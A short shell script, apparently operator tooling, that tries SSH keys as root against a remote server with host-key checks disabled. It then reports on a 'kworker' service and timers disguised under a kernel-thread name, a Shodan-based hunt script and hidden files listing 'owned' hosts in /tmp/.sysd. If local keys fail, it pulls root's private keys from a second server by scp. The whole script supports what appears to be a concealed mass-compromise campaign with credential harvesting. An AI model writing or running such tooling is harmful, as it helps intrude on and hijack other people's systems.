#!/bin/sh
# throwaway: which key opens box2 (5.161.247.9), and what is box2 actually running?
B2=root@5.161.247.9
O='-o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8'
KIT=/c/Users/Patrick/OneDrive/Desktop/test1/id_key

try() {
    k=$1
    [ -f "$k" ] || return 1
    if ssh -i "$k" $O "$B2" true 2>/dev/null; then
        echo "AUTH_OK $k"
        ssh -i "$k" $O "$B2" 'echo ACTIVE=$(systemctl is-active kworker 2>&1) TIMERS=$(systemctl list-timers "kworker-*" --no-pager 2>/dev/null | grep -c kworker) NPROC=$(nproc) SHODAN=$(grep -c shodan /tmp/.sysd/hunt.sh 2>/dev/null); wc -l /tmp/.sysd/.hunt/mass.done /tmp/.sysd/.hunt/seen.txt /tmp/.sysd/.hunt/owned.txt 2>/dev/null; echo PAYLOAD=$(pgrep -c -f sysd/kworker)' 2>&1
        return 0
    fi
    echo "no: $k"
    return 1
}

# 1) anything already on this PC
for k in "$HOME/.ssh/id_ed25519" "$HOME/.ssh/id_rsa" "$KIT"; do try "$k" && exit 0; done

# 2) fetch box1's own keypair and try that
if scp -i "$KIT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
       root@167.233.74.146:'/root/.ssh/id_*' /tmp/ 2>/dev/null; then
    chmod 600 /tmp/id_* 2>/dev/null
    for k in /tmp/id_ed25519 /tmp/id_rsa; do try "$k" && exit 0; done
fi

echo "NO KEY OPENED box2"
